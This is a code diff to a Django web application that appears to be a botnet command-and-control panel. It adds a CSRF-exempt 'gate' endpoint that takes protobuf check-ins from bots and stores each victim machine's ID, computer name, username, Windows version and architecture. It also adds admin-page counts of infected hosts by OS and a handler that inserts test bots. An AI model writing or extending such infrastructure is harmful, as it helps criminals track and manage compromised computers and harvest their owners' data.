@@ -2,6 +2,9 @@ from django.shortcuts import HttpResponse, render
 from django.http import JsonResponse
 from django.contrib.auth.models import User
 from django.contrib.auth import login
+from django.views.decorators.csrf import csrf_exempt
+from .bot_pb2 import RegisterBot
+from .models import Bot
 
 
 class AdminPanel:
@@ -10,15 +13,31 @@ class AdminPanel:
         return render(request, 'main/login.html')
 
     def get_main_page(self, request):
+        counts_is_win7 = Bot.objects.filter(is_win7=True).count()
+        counts_is_win10 = Bot.objects.filter(is_win10=True).count()
+        counts_is_winxp = Bot.objects.filter(is_winxp=True).count()
+
+        _32x = Bot.objects.filter(is_x64=False).count()
+        _64x = Bot.objects.filter(is_x64=True).count()
+
+        print(counts_is_win10)
+
         if request.user.is_superuser:
-            return render(request, 'main/main.html', {'c': [20, 20, 20, 20, 20]})
+            return render(request, 'main/main.html', {'win_version': [counts_is_win7, counts_is_winxp, 0,
+                                                                      counts_is_win10, 0],
+                                                      'x_oc': [_32x, _64x]})
+
         return HttpResponse('недостачно прав для просмотра ')
 
 
 class Handlers:
+    def create(self, request):
+        bot = Bot(uid='1', computername='test-pc1', username='user1', is_x64=True, is_server=False, is_win10=True)
+        bot.save()
+        bot1 = Bot(uid='2', computername='test-pc2', username='user2', is_x64=True, is_server=False, is_win7=True)
+        bot1.save()
 
     def login_handler(self, request):
-
         username = request.POST['login']
         usr = User.objects.get(username=username)
 
@@ -26,3 +45,32 @@ class Handlers:
             login(request, usr)
             return JsonResponse({'verdict': '200'})
         return HttpResponse('')
+
+    @csrf_exempt
+    def gate(self, request):
+        bot = RegisterBot()
+        bot.ParseFromString(request.body)
+
+        uid = bot.uid.decode('utf-16-le')
+        computername = bot.computername.decode('utf-16-le')
+        username = bot.username.decode('utf-16-le')
+        os_major = bot.os_major
+        os_minor = bot.os_minor
+        is_x64 = bot.is_x64
+        is_server = bot.is_server
+
+        try:
+            _bot = Bot.objects.get(uid=uid)
+        except:
+            _bot = Bot(uid=uid, computername=computername, username=username, is_x64=is_x64, is_server=is_server)
+
+        if os_major == 10 and os_minor == 0:
+            _bot.is_win10 = True
+        elif os_major == 6 and os_minor == 1:
+            _bot.is_win7 = True
+        elif os_major == 5 and os_minor == 1:
+            _bot.is_winxp = True
+
+        _bot.save()
+
+        return HttpResponse('200')
